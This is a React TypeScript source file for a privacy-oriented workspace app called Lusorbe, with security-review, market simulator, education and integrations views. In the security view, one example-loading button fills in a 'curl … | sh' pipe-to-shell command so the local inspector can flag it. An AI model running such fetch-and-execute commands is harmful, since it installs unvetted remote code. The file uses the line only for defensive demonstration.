import { lazy, Suspense, useEffect, useRef, useState } from 'react'
import type { ReactNode } from 'react'
const LoginTab = lazy(() => import('./components/LoginTab'))
const Assistant = lazy(() => import('./components/Assistant'))
import { inspectText, simulatePosition, exportEvents, ReviewError } from './lib/workspace'
import type { Finding, LocalEvent } from './lib/workspace'
import { LanguageSelect } from './i18n'
import { useI18n } from './i18n/context'
import type { Messages } from './i18n/pt-PT'
import './Workspace.css'

type View = 'overview' | 'security' | 'markets' | 'intelligence' | 'assistant' | 'integrations' | 'education' | 'privacy' | 'account'
type AreaId = Exclude<View, 'account'>
const AREAS: { id: AreaId; icon: string }[] = [
  { id: 'overview', icon: 'grid' }, { id: 'security', icon: 'shield' }, { id: 'markets', icon: 'chart' },
  { id: 'intelligence', icon: 'spark' }, { id: 'assistant', icon: 'chat' }, { id: 'integrations', icon: 'plug' },
  { id: 'education', icon: 'book' }, { id: 'privacy', icon: 'lock' },
]
const SOURCES = [
  { id: 'nyt', name: 'The New York Times', url: 'https://www.nytimes.com/', style: 'news' },
  { id: 'webrisk', name: 'Google Web Risk', url: 'https://cloud.google.com/security/products/web-risk', style: 'risk' },
  { id: 'nyse', name: 'NYSE', url: 'https://www.nyse.com/trade/trading-information', style: 'exchange' },
] as const
const INTEGRATIONS = [
  { id: 'google', name: 'Google', mark: 'G', url: 'https://cloud.google.com/security/products/web-risk' },
  { id: 'cloudflare', name: 'Cloudflare', mark: 'C', url: 'https://developers.cloudflare.com/dns/' },
  { id: 'nyt', name: 'The New York Times', mark: 'N', url: 'https://developer.nytimes.com/' },
  { id: 'market', name: null, mark: 'M', url: 'https://www.nyse.com/market-data' },
  { id: 'vpn', name: 'VPN', mark: 'V', url: 'https://www.wireguard.com/' },
  { id: 'assistant', name: null, mark: 'A', url: 'https://docs.claude.com/' },
] as const
type IntegrationId = (typeof INTEGRATIONS)[number]['id']
const GUIDES = ['privacy', 'security', 'markets', 'integrations'] as const
const LESSONS = ['security', 'finance', 'apis'] as const

const integrationName = (i: (typeof INTEGRATIONS)[number], m: Messages) =>
  i.name ?? (i.id === 'market' ? m.integrations.market.name : m.integrations.assistant.name)

function Icon({ name, size = 20 }: { name: string; size?: number }) {
  const paths: Record<string, ReactNode> = {
    grid: <><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/></>,
    shield: <><path d="M12 3 20 6v6c0 5-8 9-8 9s-8-4-8-9V6Z"/><path d="m8.5 12 2.5 2.5 4.5-5"/></>,
    chart: <path d="M3 3v18h18M6 15l4-5 4 3 6-8"/>, spark: <path d="m12 2 2.8 7.2L22 12l-7.2 2.8L12 22l-2.8-7.2L2 12l7.2-2.8Z"/>,
    plug: <path d="M9 3v5m6-5v5M6 8h12v3a6 6 0 0 1-12 0Zm6 9v5"/>, lock: <><rect x="5" y="10" width="14" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3m-4 5v2"/></>,
    book: <path d="M12 5v16M3 4c4-1 6 0 9 2 3-2 5-3 9-2v15c-4-1-6 0-9 2-3-2-5-3-9-2Z"/>, arrow: <path d="M5 12h14m-6-6 6 6-6 6"/>,
    chat: <path d="M4 5h16v11H9l-5 4Z"/>,
    search: <><circle cx="10.5" cy="10.5" r="6.5"/><path d="m16 16 5 5"/></>, close: <path d="m6 6 12 12M6 18 18 6"/>,
  }
  return <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">{paths[name] ?? paths['grid']}</svg>
}
function External({ href, children }: { href: string; children: ReactNode }) {
  const { m } = useI18n()
  return <a href={href} target="_blank" rel="noreferrer noopener">{children}<span className="sr-only">{m.common.external}</span></a>
}
function initialView(): View { const h = location.hash.slice(1); return [...AREAS.map(a => a.id), 'account'].includes(h) ? h as View : 'overview' }
function Chart({ period }: { period: string }) {
  const { m } = useI18n()
  const points = period === '1S' ? '0,120 25,126 50,104 80,115 110,82 140,98 165,90 200,108 235,58 270,69 300,45 330,58 360,30 400,36 440,12 480,26 520,6' : period === '1M' ? '0,140 35,120 65,145 95,95 130,115 170,92 200,104 235,70 270,90 310,52 350,74 390,40 440,56 480,22 520,38' : '0,145 40,148 80,130 120,138 160,106 200,116 240,88 280,100 320,64 360,79 400,43 440,53 480,25 520,15'
  return <svg className="market-chart" viewBox="0 0 520 190" role="img" aria-label={m.overview.chartLabel(m.overview.periods[period as '1S'] ?? period)}><defs><linearGradient id="chart-fill" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#be7754" stopOpacity=".23"/><stop offset="100%" stopColor="#be7754" stopOpacity="0"/></linearGradient></defs>{[35,80,125,170].map(y => <line key={y} x1="0" y1={y} x2="520" y2={y} stroke="#e9e5df" strokeDasharray="3 5"/>)}<polygon points={`0,190 ${points} 520,190`} fill="url(#chart-fill)"/><polyline points={points} stroke="#b56f4b" fill="none" strokeWidth="2.5" strokeLinejoin="round"/><text x="0" y="187">{m.overview.chartStart}</text><text x="520" y="187" textAnchor="end">{m.overview.chartEnd}</text></svg>
}
export default function WorkspaceApp() {
  const { m, locale } = useI18n()
  const [view, setView] = useState<View>(initialView)
  const [search, setSearch] = useState('')
  const [period, setPeriod] = useState('1M')
  const [input, setInput] = useState('')
  const [findings, setFindings] = useState<Finding[] | null>(null)
  const [error, setError] = useState('')
  const [journal, setJournal] = useState(false)
  const [events, setEvents] = useState<LocalEvent[]>([])
  const [detail, setDetail] = useState<IntegrationId | null>(null)
  const [topic, setTopic] = useState<(typeof GUIDES)[number]>('privacy')
  const [values, setValues] = useState(['1000','100','110','0.1'])
  const [lesson, setLesson] = useState<(typeof LESSONS)[number]>('security')
  const [quiz, setQuiz] = useState<'' | 'right' | 'wrong'>('')
  const [toast, setToast] = useState('')
  const heading = useRef<HTMLHeadingElement>(null)
  const dialog = useRef<HTMLDialogElement>(null)
  const area = view === 'account' ? null : m.areas[view]
  const label = area?.label ?? m.common.account
  const integration = INTEGRATIONS.find(i => i.id === detail)
  const go = (next: View) => { location.hash = next; setView(next); setSearch(''); window.scrollTo({ top: 0 }) }
  useEffect(() => { const fn = () => setView(initialView()); window.addEventListener('hashchange', fn); return () => window.removeEventListener('hashchange', fn) }, [])
  useEffect(() => { document.title = `${label} · Lusorbe`; heading.current?.focus() }, [view, label])
  useEffect(() => { if (detail) dialog.current?.showModal(); else dialog.current?.close() }, [detail])
  useEffect(() => { if (!toast) return; const timer = window.setTimeout(() => setToast(''), 5000); return () => window.clearTimeout(timer) }, [toast])
  const analyze = () => {
    try {
      const result = inspectText(input); setFindings(result); setError('')
      if (journal) setEvents(old => [{ id: Date.now(), at: new Date().toISOString(), rules: result.map(f => f.id), count: result.length }, ...old].slice(0,50))
    } catch(e) { setError(e instanceof ReviewError ? m.security.errors[e.code] : m.security.errors.generic); setFindings(null) }
  }
  const download = () => { const url = URL.createObjectURL(new Blob([exportEvents(events)], { type: 'application/json' })); const a = document.createElement('a'); a.href = url; a.download = 'lusorbe-registo-local.json'; a.click(); setTimeout(() => URL.revokeObjectURL(url), 1000); setToast(m.security.exported) }
  let simulation: ReturnType<typeof simulatePosition> | null = null
  let simulationError = ''
  if (values.some(v => !v.trim())) simulationError = m.markets.fillAll
  else { try { simulation = simulatePosition(Number(values[0]), Number(values[1]), Number(values[2]), Number(values[3])) } catch { simulationError = m.markets.invalid } }
  const money = (v: number) => v.toLocaleString(locale, { style: 'currency', currency: 'EUR' })
  const num = (v: number) => v.toLocaleString(locale)
  const clear = () => { setInput(''); setFindings(null); setError('') }
  const q = search.toLocaleLowerCase(locale)
  const matches = AREAS.filter(a => m.areas[a.id].label.toLocaleLowerCase(locale).includes(q))
  const ls = m.education.lessons[lesson]
  return <div className="aegis-frame"><a className="skip-link" href="#workspace" onClick={e => { e.preventDefault(); document.getElementById("workspace")?.focus() }}>{m.common.skip}</a>
    <aside className="aegis-sidebar"><button className="aegis-brand" onClick={() => go('overview')} aria-label={m.shell.brand}><span>Λ</span>LUSORBE<i/></button><div className="workspace-label"><span className="workspace-avatar">P</span><span>{m.shell.workspace}<small>{m.shell.workspaceSub}</small></span><b>⌄</b></div><p className="nav-label">WORKSPACE</p><nav aria-label={m.shell.nav}>{AREAS.map(a => <button className={`aegis-nav ${view === a.id ? 'active' : ''}`} aria-current={view === a.id ? 'page' : undefined} key={a.id} onClick={() => go(a.id)}><Icon name={a.icon}/>{m.areas[a.id].label}{a.id === 'security' && <span className="nav-count">{findings?.length ?? '—'}</span>}</button>)}</nav><div className="sidebar-bottom"><div className="privacy-note"><Icon name="lock" size={17}/><strong>{m.shell.privacyTitle}</strong><p>{m.shell.privacyText[0]}<br/>{m.shell.privacyText[1]}</p><button onClick={() => go('privacy')}>{m.shell.privacyControls} <span>↗</span></button></div><button className="account-button" onClick={() => go('account')}><span className="account-avatar">TU</span><span>{m.shell.yourAccount}<small>{m.shell.signInSafely}</small></span><Icon name="arrow" size={16}/></button></div></aside>
    <div className="main-column"><header className="aegis-topbar"><div className="breadcrumb">Workspace <span>/</span> <b>{label}</b></div><div className="top-actions"><div className="search-wrap"><Icon name="search" size={17}/><input aria-label={m.shell.searchLabel} placeholder={m.shell.searchPlaceholder} value={search} onChange={e => setSearch(e.target.value)}/>{search && <div className="search-results">{matches.map(a => <button key={a.id} onClick={() => go(a.id)}><Icon name={a.icon} size={16}/>{m.areas[a.id].label}</button>)}{!matches.length && <p>{m.shell.noArea}</p>}</div>}</div><LanguageSelect className="lang-picker"/><button className="private-badge" onClick={() => go('privacy')}><span/>{m.shell.private}</button></div></header>
    <main tabIndex={-1} id="workspace" className="workspace-main"><div className="page-heading"><div><p className="eyebrow">{view === 'overview' ? m.shell.eyebrowHome : m.shell.eyebrow}</p><h1 tabIndex={-1} ref={heading}>{(area ?? m.areas.account).title}</h1><p className="page-subtitle">{(area ?? m.areas.account).subtitle}</p></div><span className="edition">{m.shell.edition} <b>01</b></span></div>
      {view === 'overview' && <><section className="hero-panel"><div className="hero-copy"><span className="hero-label"><i/>{m.overview.heroLabel}</span><h2>{m.overview.heroTitle}<br/><em>{m.overview.heroEm}</em></h2><p>{m.overview.heroText[0]}<br/>{m.overview.heroText[1]}</p><div className="button-row"><button className="button button-dark" onClick={() => go('security')}>{m.overview.openDefense} <Icon name="arrow" size={17}/></button><button className="button button-quiet" onClick={() => go('integrations')}>{m.overview.exploreIntegrations}</button></div></div><div className="orb-scene" aria-hidden="true"><div className="orbit orbit-one"/><div className="orbit orbit-two"/><div className="orb"><span>Λ</span></div><span className="orb-coordinate top">38° 43′ N</span><span className="orb-coordinate bottom">PRIVATE BY DESIGN</span><i className="orb-point"/></div></section>
      <div className="status-strip"><span><i/>{m.overview.localAnalysis} <b>{m.overview.available}</b></span><span><Icon name="plug" size={15}/>{m.overview.external} <b>{m.overview.toConfigure}</b></span><span><Icon name="lock" size={15}/>{m.overview.journal} <b>{journal ? m.overview.journalOn : m.overview.journalOff}</b></span><button onClick={() => go('privacy')}>{m.overview.transparency}</button></div>
      <div className="quick-grid">{([['security','shield'],['markets','chart'],['intelligence','spark']] as const).map(([v, icon]) => { const c = m.overview.cards[v]; return <button key={v} className="quick-card" onClick={() => go(v)}><span className="icon-box"><Icon name={icon}/></span><span className="card-kicker">{c.label}</span><h3>{c.title}</h3><p>{c.text}</p><span className="card-arrow"><Icon name="arrow"/></span></button> })}</div>
      <div className="overview-grid"><section className="aegis-panel"><div className="panel-top"><div><p className="eyebrow">{m.overview.lab}</p><h2>{m.overview.labTitle}</h2></div><button className="round-button" aria-label={m.overview.openMarkets} onClick={() => go('markets')}><Icon name="arrow"/></button></div><div className="chart-heading"><div><strong>{m.overview.sampleIndex}</strong><span>{m.overview.sampleNote}</span></div><div className="segmented" aria-label={m.overview.period}>{(['1S','1M','1A'] as const).map(p => <button key={p} className={period === p ? 'selected' : ''} aria-pressed={period === p} onClick={() => setPeriod(p)}>{m.overview.periods[p]}</button>)}</div></div><Chart period={period}/><div className="chart-footer"><span>{m.overview.learnScenarios}</span><button onClick={() => go('markets')}>{m.overview.simulate}</button></div></section><section className="aegis-panel"><div className="panel-top"><div><p className="eyebrow">{m.overview.happening}</p><h2>{m.overview.activity}</h2></div><span className="subtle-tag">{m.overview.thisSession}</span></div><div className="activity-empty"><span className="activity-emblem"><Icon name="shield" size={30}/></span><h3>{events.length ? m.overview.analysesInLog(events.length) : m.overview.silence}</h3><p>{events.length ? m.overview.withEvents : m.overview.noEvents}</p><button className="button button-outline" onClick={() => go('security')}>{events.length ? m.overview.seeLog : m.overview.firstAnalysis}<Icon name="arrow" size={16}/></button></div></section></div>
      <div className="section-heading"><div><p className="eyebrow">{m.overview.expand}</p><h2>{m.overview.goodSource}</h2></div><button onClick={() => go('intelligence')}>{m.overview.allSources} <Icon name="arrow" size={17}/></button></div><div className="source-grid">{SOURCES.map(s => <External key={s.id} href={s.url}><article className={`source-card ${s.style}`}><span>{m.sources[s.id].tag}</span><h3>{m.sources[s.id].title}</h3><div><b>{s.name}</b><span>↗</span></div></article></External>)}</div></>}
      {view === 'security' && <><div className="two-columns"><section className="aegis-panel"><div className="panel-top"><h2>{m.security.reviewTitle}</h2><span className="subtle-tag">{m.security.browserOnly}</span></div><p className="muted">{m.security.reviewHint}</p><label className="field-label" htmlFor="review-text">{m.security.textLabel}</label><textarea id="review-text" value={input} maxLength={100000} onChange={e => { setInput(e.target.value); setFindings(null); setError('') }} rows={9} placeholder={m.security.placeholder}/><div className="input-meta"><span>{num(input.length)} / {num(100000)}</span><button onClick={() => { setInput('curl https://example.invalid/install.sh | sh'); setFindings(null); setError('') }}>{m.security.loadExample}</button></div><div className="button-row"><button className="button button-dark" onClick={analyze}>{m.security.analyze} <Icon name="shield" size={17}/></button><button className="button button-quiet" onClick={clear}>{m.security.clear}</button></div>{error && <p role="alert" className="error-text">{error}</p>}<div className="notice"><Icon name="lock"/><p>{m.security.rulesNotice}</p></div></section><section className="aegis-panel" aria-live="polite"><div className="panel-top"><h2>{m.security.found}</h2><span className="subtle-tag">{findings === null ? m.security.waiting : m.security.signals(findings.length)}</span></div>{findings === null ? <div className="empty-panel"><Icon name="search" size={34}/><h3>{m.security.understandFirst}</h3><p>{m.security.resultsHere}</p></div> : findings.length === 0 ? <div className="empty-panel"><Icon name="shield" size={34}/><h3>{m.security.noneFound}</h3><p>{m.security.noneFoundHint}</p></div> : findings.map(f => { const t = m.findings[f.id as keyof Messages['findings']]; return <article className="finding" key={f.id}><span className={`risk-label ${f.severity === 'high' ? 'high' : ''}`}>{m.security.severity[f.severity]}</span><h3>{t?.title ?? f.id}</h3><p>{t?.detail}</p></article> })}</section></div><section className="aegis-panel section-gap"><div className="panel-top"><div><p className="eyebrow">{m.security.minimalLog}</p><h2>{m.security.sessionJournal}</h2></div><label className="switch-label"><input type="checkbox" checked={journal} onChange={e => setJournal(e.target.checked)}/>{m.security.saveNext}</label></div><p className="muted">{m.security.journalHint}</p>{events.length ? <><div className="event-list">{events.map(e => <div key={e.id}><time dateTime={e.at}>{new Date(e.at).toLocaleTimeString(locale)}</time><strong>{m.security.signals(e.count)}</strong><span>{e.rules.join(' · ') || m.security.noMatches}</span></div>)}</div><div className="button-row"><button className="button button-outline" onClick={download}>{m.security.export}</button><button className="button button-quiet" onClick={() => { setEvents([]); setToast(m.security.deleted) }}>{m.security.deleteLog}</button></div></> : <p className="empty-inline">{m.security.noLogs}</p>}</section></>}
      {view === 'markets' && <><div className="notice market-notice"><Icon name="chart"/><p><strong>{m.markets.hoursTitle}</strong> {m.markets.hoursText} <External href="https://www.nyse.com/trade/trading-information">{m.markets.nyseHours}</External></p></div><div className="two-columns"><section className="aegis-panel"><p className="eyebrow">{m.markets.noCapital}</p><h2>{m.markets.simulator}</h2><p className="muted">{m.markets.simulatorHint}</p><div className="form-grid">{m.markets.fields.map((fieldLabel,index) => <label key={index}>{fieldLabel}<input type="number" min="0" step="any" value={values[index]} onChange={e => setValues(old => old.map((v,i) => i === index ? e.target.value : v))}/></label>)}</div><div className="simulation-result" aria-live="polite">{simulation ? <><span>{m.markets.netResult}</span><strong className={simulation.profit >= 0 ? 'positive' : 'negative'}>{simulation.profit > 0 ? '+' : ''}{money(simulation.profit)}</strong><div><span>{m.markets.finalBalance} <b>{money(simulation.finalValue)}</b></span><span>{m.markets.change} <b>{simulation.percent.toLocaleString(locale, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}%</b></span></div></> : <p role="alert">{simulationError}</p>}</div><p className="caption">{m.markets.educational}</p></section><section className="aegis-panel"><div className="panel-top"><h2>{m.markets.follow}</h2><span className="subtle-tag">{m.markets.offline}</span></div>{([['equities','EQ'],['crypto','CR'],['fx','FX']] as const).map(([id, symbol]) => <div className="market-row" key={id}><span className="market-symbol">{symbol}</span><div><h3>{m.markets.rows[id].name}</h3><p>{m.markets.rows[id].text}</p></div><span>—</span></div>)}<div className="notice"><Icon name="plug"/><p>{m.markets.noFakePrices}</p></div><button className="button button-dark" onClick={() => go('integrations')}>{m.markets.seeIntegrations} <Icon name="arrow" size={17}/></button></section></div></>}
      {view === 'intelligence' && <div className="two-columns"><section className="aegis-panel guide-panel"><span className="icon-box"><Icon name="spark"/></span><p className="eyebrow">{m.intelligence.kicker}</p><h2>{m.intelligence.title}</h2><p className="muted">{m.intelligence.hint}</p><div className="topic-list">{GUIDES.map(t => <button key={t} className={topic === t ? 'selected' : ''} onClick={() => setTopic(t)}>{m.guides[t].label}<Icon name="arrow" size={16}/></button>)}</div><div className="guide-answer" aria-live="polite"><h3>{m.intelligence.question}</h3><p>{m.guides[topic].text}</p></div><button className="text-link" onClick={() => go('assistant')}>{m.intelligence.askAssistant}</button></section><section className="aegis-panel"><p className="eyebrow">{m.intelligence.reading}</p><h2>{m.intelligence.fromSource}</h2><div className="reading-list">{SOURCES.map(s => <article key={s.id}><span>{m.sources[s.id].tag}</span><h3>{s.name}</h3><p>{m.sources[s.id].text}</p><External href={s.url}>{m.intelligence.openSource}</External></article>)}</div></section></div>}
      {view === 'integrations' && <><div className="integration-grid">{INTEGRATIONS.map(i => <article className="aegis-panel integration-card" key={i.id}><div className="panel-top"><span className="integration-symbol">{i.mark}</span><span className="subtle-tag">{i.id === 'assistant' ? m.integrations.withAccount : m.integrations.notConnected}</span></div><h2>{integrationName(i, m)}</h2><span className="card-kicker">{m.integrations[i.id].category}</span><p>{m.integrations[i.id].text}</p>{i.id === 'assistant' ? <button className="button button-outline" onClick={() => go('assistant')}>{m.integrations.openAssistant} <Icon name="arrow" size={16}/></button> : <button className="button button-outline" onClick={() => setDetail(i.id)}>{m.integrations.requirements} <Icon name="arrow" size={16}/></button>}</article>)}</div><div className="notice section-gap"><Icon name="lock"/><p>{m.integrations.notice}</p></div></>}
      {view === 'privacy' && <><div className="privacy-hero"><Icon name="lock" size={38}/><div><p className="eyebrow">{m.privacy.notPremium}</p><h2>{m.privacy.base}</h2><p>{m.privacy.baseText}</p></div></div><div className="two-columns"><section className="aegis-panel"><h2>{m.privacy.controls}</h2><div className="privacy-row"><div><h3>{m.privacy.localJournal}</h3><p>{m.privacy.localJournalHint}</p></div><input aria-label={m.privacy.toggleJournal} type="checkbox" checked={journal} onChange={e => setJournal(e.target.checked)}/></div><div className="privacy-row"><div><h3>{m.privacy.saved}</h3><p>{m.privacy.savedCount(events.length)}</p></div><button className="text-link" disabled={!events.length} onClick={download}>{m.privacy.export}</button></div><button className="button button-outline" onClick={() => { clear(); setEvents([]); setJournal(false); setToast(m.privacy.deletedAll) }}>{m.privacy.deleteAll}</button></section><section className="aegis-panel"><h2>{m.privacy.whatHappens}</h2><ul className="plain-list">{m.privacy.items.map(([title, text]) => <li key={title}><b>{title}</b><span>{text}</span></li>)}</ul><a className="text-link" href="/legal/privacy.html">{m.privacy.readPolicy}</a></section></div></>}
      {view === 'education' && <><div className="topic-list education-topics">{LESSONS.map(t => <button key={t} className={lesson === t ? 'selected' : ''} onClick={() => { setLesson(t); setQuiz('') }}>{m.education.lessons[t].name}<Icon name="arrow" size={16}/></button>)}</div><section className="aegis-panel lesson-panel"><p className="eyebrow">{m.education.kicker}</p><h2>{ls.name}</h2><p className="lesson-lead">{ls.lead}</p><p>{ls.text}</p><div className="quiz"><h3>{ls.question}</h3><button onClick={() => setQuiz('wrong')}>{ls.wrong}</button><button onClick={() => setQuiz('right')}>{ls.right}</button>{quiz && <p role="status">{quiz === 'right' ? m.education.correct : m.education.reconsider}</p>}</div></section></>}
      {view === 'assistant' && <Suspense fallback={<p role="status">{m.common.loadingAssistant}</p>}><Assistant onSignIn={() => go('account')}/></Suspense>}
      {view === 'account' &&<section className="aegis-panel account-panel"><Suspense fallback={<p role="status">{m.common.loadingAccess}</p>}><LoginTab/></Suspense></section>}
      <footer className="workspace-footer"><span><b>Λ</b> LUSORBE <i>/</i> {m.shell.footer}</span><div><button onClick={() => go('privacy')}>{m.areas.privacy.label}</button><a href="/legal/terms.html" title={m.shell.legalNote}>{m.shell.terms}</a><span>{m.shell.noTracking}</span></div></footer>
    </main></div>
    <dialog ref={dialog} className="integration-dialog" aria-labelledby="dialog-title" onCancel={() => setDetail(null)} onClose={() => setDetail(null)}>{integration && <><button className="dialog-close" aria-label={m.integrations.close} onClick={() => setDetail(null)}><Icon name="close"/></button><span className="integration-symbol">{integration.mark}</span><p className="eyebrow">{m.integrations.dialogKicker}</p><h2 id="dialog-title">{integrationName(integration, m)}</h2><p>{m.integrations[integration.id].text}</p><ol>{m.integrations.steps.map(s => <li key={s}>{s}</li>)}</ol><External href={integration.url}>{m.integrations.docs}</External><p className="caption">{m.integrations.nothingSent}</p></>}</dialog>
    {toast && <div className="toast" role="status">{toast}</div>}
  </div>
}
